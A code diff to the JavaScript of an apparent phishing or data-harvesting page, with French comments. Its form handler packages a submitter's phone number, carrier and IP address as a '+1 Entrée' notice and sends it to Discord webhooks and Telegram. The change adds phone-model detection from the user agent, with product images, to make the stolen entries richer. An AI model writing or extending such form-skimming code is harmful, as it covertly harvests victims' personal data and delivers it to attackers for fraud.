@@ -119,6 +119,23 @@
       }
     }
 
+    // Detecte téléphone et retourne nom + image à mettre dans l'embed
+    function detectPhone(ua) {
+      ua = ua.toLowerCase();
+      if (ua.includes("iphone")) {
+        return {
+          name: "iPhone 16",
+          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/93cf8df0-767b-4323-a17d-0f01f5ce4b04-1_397f83c1-ffc4-4de0-bdfd-bb38a263a770.jpg"
+        };
+      } else if (ua.includes("android")) {
+        return {
+          name: "Samsung Galaxy",
+          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/3bd83a62-d359-44b0-b61d-481ae6f75710-1_4b547b9e-c5cb-4391-a422-227bab0ac5d2.jpg"
+        };
+      }
+      return null;
+    }
+
     document.getElementById("form2").addEventListener("submit", async (e) => {
       e.preventDefault();
       const msgElem = document.getElementById("msg");
@@ -149,6 +166,8 @@
         webhookToUse = DISCORD_ALT_WEBHOOK_URL;
       }
 
+      const phoneInfo = detectPhone(ua);
+
       const discordEmbed = {
         title: "🍭 +1 Entrée 🍭",
         color: 0x9b00ff,
@@ -169,8 +188,7 @@
               `📞 Téléphone   : ${telephone}\n` +
               `📶 Opérateur   : ${operateur}\n\n` +
 
-              `📟 IP          : ${ip}\n` +
-              `🔎 User-Agent  : ${ua}`
+              `📟 IP          : ${ip}`
           }
         ],
         timestamp: new Date().toISOString(),
@@ -178,6 +196,15 @@
           text: "📥 Données reçues via le formulaire"
         }
       };
+
+      if (phoneInfo) {
+        discordEmbed.thumbnail = { url: phoneInfo.imageUrl };
+        discordEmbed.fields.push({
+          name: "📱 Téléphone détecté",
+          value: phoneInfo.name,
+          inline: true
+        });
+      }
 
       const telegramText =
         `[🎲] INFOS [🎲]\n\n` +
